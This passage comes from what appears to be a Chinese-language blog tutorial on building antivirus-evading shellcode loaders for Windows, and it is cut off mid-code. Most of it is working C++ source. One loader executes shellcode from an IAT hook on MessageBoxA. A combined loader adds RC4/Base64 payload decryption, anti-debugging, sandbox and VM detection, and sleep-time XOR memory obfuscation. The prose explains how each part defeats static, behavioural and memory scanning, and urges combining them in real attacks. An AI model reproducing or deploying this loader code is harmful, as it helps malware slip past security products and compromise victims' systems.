class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 申请可执行内存</span></span><br><span class="line">    LPVOID allocMem = <span class="built_in">VirtualAlloc</span>(</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="built_in">sizeof</span>(shellcode),</span><br><span class="line">        MEM_COMMIT | MEM_RESERVE,</span><br><span class="line">        PAGE_EXECUTE_READWRITE</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (!allocMem) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 写入 Shellcode</span></span><br><span class="line">    <span class="built_in">memcpy</span>(allocMem, shellcode, <span class="built_in">sizeof</span>(shellcode));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行 Shellcode（伪装成函数调用）</span></span><br><span class="line">    <span class="keyword">using</span> ShellcodeFunc = <span class="built_in">void</span>(*)();</span><br><span class="line">    ShellcodeFunc runShellcode = (ShellcodeFunc)allocMem;</span><br><span class="line">    <span class="built_in">runShellcode</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. Hook 函数定义</span></span><br><span class="line"><span class="keyword">using</span> PrototypeMessageBox = <span class="built_in">int</span>(WINAPI*)(HWND, LPCSTR, LPCSTR, UINT);</span><br><span class="line">PrototypeMessageBox originalMsgBox = MessageBoxA;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">hookedMessageBox</span><span class="params">(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 触发 Shellcode 执行</span></span><br><span class="line">    <span class="built_in">ExecuteShellcode</span>();</span><br><span class="line">    <span class="comment">// 调用原始函数，保持程序正常</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">originalMsgBox</span>(hWnd, lpText, lpCaption, uType);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. IAT Hook 实现</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">IATHookMessageBox</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 获取当前进程的基址</span></span><br><span class="line">    LPVOID imageBase = <span class="built_in">GetModuleHandleA</span>(<span class="literal">NULL</span>);</span><br><span class="line">    PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)imageBase;</span><br><span class="line">    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)imageBase + dosHeaders-&gt;e_lfanew);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定位导入表</span></span><br><span class="line">    PIMAGE_IMPORT_DESCRIPTOR importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(</span><br><span class="line">        ntHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress + (DWORD_PTR)imageBase</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历所有导入的 DLL</span></span><br><span class="line">    <span class="keyword">while</span> (importDescriptor-&gt;Name != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        LPCSTR libraryName = (LPCSTR)importDescriptor-&gt;Name + (DWORD_PTR)imageBase;</span><br><span class="line">        HMODULE library = <span class="built_in">LoadLibraryA</span>(libraryName);</span><br><span class="line">        <span class="keyword">if</span> (!library) &#123;</span><br><span class="line">            importDescriptor++;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取导入函数表</span></span><br><span class="line">        PIMAGE_THUNK_DATA originalFirstThunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)imageBase + importDescriptor-&gt;OriginalFirstThunk);</span><br><span class="line">        PIMAGE_THUNK_DATA firstThunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)imageBase + importDescriptor-&gt;FirstThunk);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 遍历所有导入函数</span></span><br><span class="line">        <span class="keyword">while</span> (originalFirstThunk-&gt;u<span class="number">1.</span>AddressOfData != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)imageBase + originalFirstThunk-&gt;u<span class="number">1.</span>AddressOfData);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 找到目标函数 MessageBoxA</span></span><br><span class="line">            <span class="keyword">if</span> (std::<span class="built_in">string</span>(functionName-&gt;Name) == <span class="string">&quot;MessageBoxA&quot;</span>) &#123;</span><br><span class="line">                <span class="comment">// 修改内存保护属性为可写</span></span><br><span class="line">                DWORD oldProtect = <span class="number">0</span>;</span><br><span class="line">                <span class="built_in">VirtualProtect</span>(&amp;firstThunk-&gt;u<span class="number">1.F</span>unction, <span class="number">8</span>, PAGE_READWRITE, &amp;oldProtect);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 替换函数地址</span></span><br><span class="line">                firstThunk-&gt;u<span class="number">1.F</span>unction = (DWORD_PTR)hookedMessageBox;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 恢复内存保护属性</span></span><br><span class="line">                <span class="built_in">VirtualProtect</span>(&amp;firstThunk-&gt;u<span class="number">1.F</span>unction, <span class="number">8</span>, oldProtect, &amp;oldProtect);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            originalFirstThunk++;</span><br><span class="line">            firstThunk++;</span><br><span class="line">        &#125;</span><br><span class="line">        importDescriptor++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 执行 IAT Hook</span></span><br><span class="line">    <span class="built_in">IATHookMessageBox</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 触发 Hook（调用 MessageBoxA 时执行 Shellcode）</span></span><br><span class="line">    <span class="built_in">MessageBoxA</span>(<span class="literal">NULL</span>, <span class="string">&quot;这是一个正常的弹窗&quot;</span>, <span class="string">&quot;IAT Hook 演示&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="免杀优势分析"><a href="#免杀优势分析" class="headerlink" title="免杀优势分析"></a>免杀优势分析</h2><p><strong>对抗静态检测</strong>：</p>
<ul>
<li>Shellcode 不直接暴露在代码中，可结合加密存储</li>
<li>导入表中只有合法函数（<code>MessageBoxA</code>），无敏感 API</li>
<li>编译后的可执行文件看起来是正常程序</li>
</ul>
<p><strong>对抗动态检测</strong>：</p>
<ul>
<li>Shellcode 执行伪装成合法函数调用</li>
<li>行为分析会认为是正常的 <code>MessageBoxA</code> 弹窗操作</li>
<li>无直接的 <code>VirtualAlloc</code> + <code>CreateThread</code> 特征组合</li>
</ul>
<p><strong>对抗内存扫描</strong>：</p>
<ul>
<li>Shellcode 在 Hook 触发前不存在于内存中</li>
<li>可以在执行后立即释放内存，缩短检测窗口</li>
<li>结合内存加密技术（如 Sleep Obfuscation），进一步对抗内存扫描</li>
</ul>
<h2 id="进阶优化方向"><a href="#进阶优化方向" class="headerlink" title="进阶优化方向"></a>进阶优化方向</h2><ol>
<li><strong>动态 API 解析</strong>：使用 <code>GetProcAddress</code> 动态获取函数地址，避免静态导入</li>
<li><strong>多函数 Hook</strong>：同时 Hook 多个高频函数（如 <code>CreateFileA</code>、<code>RegOpenKeyA</code>），分散执行特征</li>
<li><strong>延迟执行</strong>：Hook 触发后不立即执行 Shellcode，而是等待特定条件（如时间、用户操作）</li>
<li><strong>内存混淆</strong>：在 Shellcode 执行前后对内存进行 XOR 混淆，对抗内存扫描</li>
<li><strong>反调试检测</strong>：在 Hook 函数中加入反调试逻辑，检测到调试器时退出</li>
</ol>
<hr>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本文介绍了两种主流的 Shellcode 加载技术：</p>
<ol>
<li><strong>RC4 + Base64 加密</strong>：通过双层加密对抗静态特征检测，适合快速生成免杀样本</li>
<li><strong>IAT Hook 隐藏执行</strong>：通过劫持合法函数对抗行为检测，适合高对抗环境</li>
</ol>
<p>实战中建议将两种技术结合使用：</p>
<ul>
<li>使用 RC4 + Base64 加密 Shellcode</li>
<li>使用 IAT Hook 隐藏执行行为</li>
<li>结合反沙箱、反调试、内存混淆等技术</li>
<li>定期更新加密密钥和 Hook 目标函数</li>
</ul>
<p>免杀是一个持续对抗的过程，没有一劳永逸的方案。需要根据目标环境的安全产品特点，灵活调整技术组合。</p>
<hr>
<h1 id="综合实战：多重对抗技术组合"><a href="#综合实战：多重对抗技术组合" class="headerlink" title="综合实战：多重对抗技术组合"></a>综合实战：多重对抗技术组合</h1><p>以下是将 RC4+Base64 加密、IAT Hook、反沙箱、反调试、内存混淆等技术融合的完整实现。</p>
<h2 id="完整加载器代码"><a href="#完整加载器代码" class="headerlink" title="完整加载器代码"></a>完整加载器代码</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winternl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;rc4.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;base64.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ==================== 反调试检测 ====================</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief 检测调试器（多种方法组合）</span></span><br><span class="line"><span class="comment"> * @return true 检测到调试器，false 未检测到</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">IsDebuggerDetected</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 方法1：IsDebuggerPresent API</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">IsDebuggerPresent</span>()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 方法2：CheckRemoteDebuggerPresent</span></span><br><span class="line">    BOOL isDebuggerPresent = FALSE;</span><br><span class="line">    <span class="built_in">CheckRemoteDebuggerPresent</span>(<span class="built_in">GetCurrentProcess</span>(), &amp;isDebuggerPresent);</span><br><span class="line">    <span class="keyword">if</span> (isDebuggerPresent) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 方法3：PEB 检查（BeingDebugged 标志）</span></span><br><span class="line">    PPEB pPeb = (PPEB)__readgsqword(<span class="number">0x60</span>);  <span class="comment">// 64位系统</span></span><br><span class="line">    <span class="keyword">if</span> (pPeb-&gt;BeingDebugged) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 方法4：NtGlobalFlag 检查（调试器会设置特殊标志）</span></span><br><span class="line">    DWORD ntGlobalFlag = *(PDWORD)((PBYTE)pPeb + <span class="number">0xBC</span>);</span><br><span class="line">    <span class="keyword">if</span> (ntGlobalFlag &amp; <span class="number">0x70</span>) &#123;  <span class="comment">// FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ==================== 反沙箱检测 ====================</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief 检测沙箱环境（多维度检测）</span></span><br><span class="line"><span class="comment"> * @return true 检测到沙箱，false 未检测到</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">IsSandboxDetected</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 检测1：系统运行时间（沙箱通常刚启动）</span></span><br><span class="line">    DWORD uptime = <span class="built_in">GetTickCount</span>();</span><br><span class="line">    <span class="keyword">if</span> (uptime &lt; <span class="number">600000</span>) &#123;  <span class="comment">// 小于10分钟</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检测2：CPU 核心数（沙箱通常只有1-2核）</span></span><br><span class="line">    SYSTEM_INFO sysInfo;</span><br><span class="line">    <span class="built_in">GetSystemInfo</span>(&amp;sysInfo);</span><br><span class="line">    <span class="keyword">if</span> (sysInfo.dwNumberOfProcessors &lt; <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检测3：内存大小（沙箱通常内存较小）</span></span><br><span class="line">    MEMORYSTATUSEX memStatus;</span><br><span class="line">    memStatus.dwLength = <span class="built_in">sizeof</span>(memStatus);</span><br><span class="line">    <span class="built_in">GlobalMemoryStatusEx</span>(&amp;memStatus);</span><br><span class="line">    <span class="keyword">if</span> (memStatus.ullTotalPhys &lt; <span class="number">2ULL</span> * <span class="number">1024</span> * <span class="number">1024</span> * <span class="number">1024</span>) &#123;  <span class="comment">// 小于2GB</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检测4：磁盘大小（沙箱通常磁盘较小）</span></span><br><span class="line">    ULARGE_INTEGER freeBytesAvailable, totalNumberOfBytes, totalNumberOfFreeBytes;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">GetDiskFreeSpaceExA</span>(<span class="string">&quot;C:\\&quot;</span>, &amp;freeBytesAvailable, &amp;totalNumberOfBytes, &amp;totalNumberOfFreeBytes)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (totalNumberOfBytes.QuadPart &lt; <span class="number">60ULL</span> * <span class="number">1024</span> * <span class="number">1024</span> * <span class="number">1024</span>) &#123;  <span class="comment">// 小于60GB</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检测5：用户交互痕迹（检查最近文件列表）</span></span><br><span class="line">    <span class="type">char</span> recentPath[MAX_PATH];</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">SHGetFolderPathA</span>(<span class="literal">NULL</span>, CSIDL_RECENT, <span class="literal">NULL</span>, <span class="number">0</span>, recentPath) == S_OK) &#123;</span><br><span class="line">        WIN32_FIND_DATAA findData;</span><br><span class="line">        <span class="type">char</span> searchPath[MAX_PATH];</span><br><span class="line">        <span class="built_in">sprintf_s</span>(searchPath, <span class="string">&quot;%s\\*&quot;</span>, recentPath);</span><br><span class="line">        HANDLE hFind = <span class="built_in">FindFirstFileA</span>(searchPath, &amp;findData);</span><br><span class="line">        <span class="type">int</span> fileCount = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (hFind != INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (!(findData.dwFileAttributes &amp; FILE_ATTRIBUTE_DIRECTORY)) &#123;</span><br><span class="line">                    fileCount++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">while</span> (<span class="built_in">FindNextFileA</span>(hFind, &amp;findData));</span><br><span class="line">            <span class="built_in">FindClose</span>(hFind);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (fileCount &lt; <span class="number">5</span>) &#123;  <span class="comment">// 最近文件少于5个</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检测6：虚拟机特征（检查特定进程）</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* vmProcesses[] = &#123;</span><br><span class="line">        <span class="string">&quot;vmtoolsd.exe&quot;</span>,      <span class="comment">// VMware</span></span><br><span class="line">        <span class="string">&quot;vboxservice.exe&quot;</span>,   <span class="comment">// VirtualBox</span></span><br><span class="line">        <span class="string">&quot;vboxtray.exe&quot;</span>,      <span class="comment">// VirtualBox</span></span><br><span class="line">        <span class="string">&quot;xenservice.exe&quot;</span>,    <span class="comment">// Xen</span></span><br><span class="line">        <span class="string">&quot;qemu-ga.exe&quot;</span>        <span class="comment">// QEMU</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    HANDLE hSnapshot = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (hSnapshot != INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        PROCESSENTRY32 pe32;</span><br><span class="line">        pe<span class="number">32.</span>dwSize = <span class="built_in">sizeof</span>(PROCESSENTRY32);</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">Process32First</span>(hSnapshot, &amp;pe32)) &#123;</span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">sizeof</span>(vmProcesses) / <span class="built_in">sizeof</span>(vmProcesses[<span class="number">0</span>]); i++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (_stricmp(pe<span class="number">32.</span>szExeFile, vmProcesses[i]) == <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="built_in">CloseHandle</span>(hSnapshot);</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">while</span> (<span class="built_in">Process32Next</span>(hSnapshot, &amp;pe32));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hSnapshot);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ==================== 内存混淆（Sleep Obfuscation）====================</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief 内存混淆：在 Sleep 期间对 Shellcode 进行 XOR 加密</span></span><br><span class="line"><span class="comment"> * @param shellcodeAddr Shellcode 地址</span></span><br><span class="line"><span class="comment"> * @param shellcodeSize Shellcode 大小</span></span><br><span class="line"><span class="comment"> * @param sleepTime 休眠时间（毫秒）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">SleepObfuscation</span><span class="params">(LPVOID shellcodeAddr, SIZE_T shellcodeSize, DWORD sleepTime)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 生成随机 XOR 密钥</span></span><br><span class="line">    BYTE xorKey = (BYTE)(<span class="built_in">rand</span>() % <span class="number">256</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 修改内存保护为可读写</span></span><br><span class="line">    DWORD oldProtect;</span><br><span class="line">    <span class="built_in">VirtualProtect</span>(shellcodeAddr, shellcodeSize, PAGE_READWRITE, &amp;oldProtect);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// XOR 加密 Shellcode</span></span><br><span class="line">    <span class="keyword">for</span> (SIZE_T i = <span class="number">0</span>; i &lt; shellcodeSize; i++) &#123;</span><br><span class="line">        ((BYTE*)shellcodeAddr)[i] ^= xorKey;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 休眠</span></span><br><span class="line">    <span class="built_in">Sleep</span>(sleepTime);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// XOR 解密 Shellcode</span></span><br><span class="line">    <span class="keyword">for</span> (SIZE_T i = <span class="number">0</span>; i &lt; shellcodeSize; i++) &#123;</span><br><span class="line">        ((BYTE*)shellcodeAddr)[i] ^= xorKey;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 恢复内存保护为可执行</span></span><br><span class="line">    <span class="built_in">VirtualProtect</span>(shellcodeAddr, shellcodeSize, oldProtect, &amp;oldProtect);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ==================== IAT Hook 实现 ====================</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 全局变量：存储解密后的 Shellcode</span></span><br><span class="line">std::vector&lt;<span class="type">unsigned</span> <span class="type">char</span>&gt; g_decryptedShellcode;</span><br><span class="line"><span class="type">bool</span> g_shellcodeExecuted = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief Shellcode 执行函数（结合内存混淆）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ExecuteShellcode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (g_shellcodeExecuted || g_decryptedShellcode.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 申请可执行内存（使用堆，降低特征）</span></span><br><span class="line">    HANDLE hHeap = <span class="built_in">HeapCreate</span>(HEAP_CREATE_ENABLE_EXECUTE | HEAP_ZERO_MEMORY, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (hHeap == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span 